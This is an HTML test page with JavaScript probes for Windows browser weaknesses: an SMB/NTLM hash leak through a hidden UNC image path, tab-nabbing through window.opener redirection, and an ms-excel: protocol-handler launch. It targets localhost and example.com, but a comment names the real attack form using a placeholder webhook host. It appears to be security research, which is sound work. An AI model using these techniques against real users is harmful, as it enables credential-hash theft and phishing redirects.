<!DOCTYPE html>
<html>
<head>
    <title>Windows Deep Research v2</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Consolas', monospace; padding: 20px; }
        .card { border: 1px solid #0f0; padding: 15px; margin-bottom: 20px; background: #111; }
        button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 100%; margin: 5px 0; cursor: pointer; }
        .log { background: #000; height: 150px; overflow-y: scroll; border: 1px dashed #444; padding: 10px; font-size: 11px; color: #0af; }
    </style>
</head>
<body>

    <div class="card">
        <h3>1. SMB Hash Leak Test</h3>
        <p style="font-size:0.7rem; color:#888;">Check if browser tries to authenticate with network shares.</p>
        <button onclick="testSMBLeak()">Test SMB Auth Leak</button>
        <img src="file://127.0.0.1/c$/test.png" style="display:none;" id="leakImg">
    </div>

    <div class="card">
        <h3>2. Advanced Tab-Nabbing</h3>
        <p style="font-size:0.7rem; color:#888;">Does the child tab have power over this page?</p>
        <button onclick="testAdvancedNabbing()">Launch Nabbing Attack</button>
    </div>

    <div class="card">
        <h3>3. Protocol Bypass (Variation)</h3>
        <button onclick="testFailingProtocol()">Test ms-excel: (Check Prompt)</button>
    </div>

    <div id="log" class="log">Awaiting Windows Command...</div>

    <script>
        const log = (m) => { document.getElementById('log').innerHTML += "<br>> " + m; };

        // 1. SMB Leak: Windows behavior check
        function testSMBLeak() {
            log("Attempting SMB Path access via Image...");
            // Real attack uses a remote IP: \\YOUR_WEBHOOK_IP\share\file.jpg
            document.getElementById('leakImg').src = "\\\\127.0.0.1\\c$\\Windows\\win.ini";
            log("Check if browser showed a login prompt or blocked it.");
        }

        // 2. Tab-Nabbing: Redirecting parent
        function testAdvancedNabbing() {
            log("Opening vulnerable child window...");
            // We open a page we control (or any page)
            let win = window.open("", "_blank");
            win.document.write("<h1>Child Tab</h1><p>Parent will redirect in 3s...</p>");
            
            setTimeout(() => {
                try {
                    // This is where the magic happens
                    if (win.opener) {
                        win.opener.location = "https://example.com/?nabbed=true";
                        log("REDIRECT COMMAND SENT TO PARENT!");
                    }
                } catch(e) {
                    log("Blocked: cross-origin opener policy (COOP) active.");
                }
            }, 3000);
        }

        // 3. Testing different protocols for missing prompts
        function testFailingProtocol() {
            log("Testing ms-excel: protocol...");
            // Microsoft Office protocols sometimes have less strict prompts
            window.location.href = "ms-excel:ofv|u|https://example.com/test.xlsx";
        }
    </script>
</body>
</html>
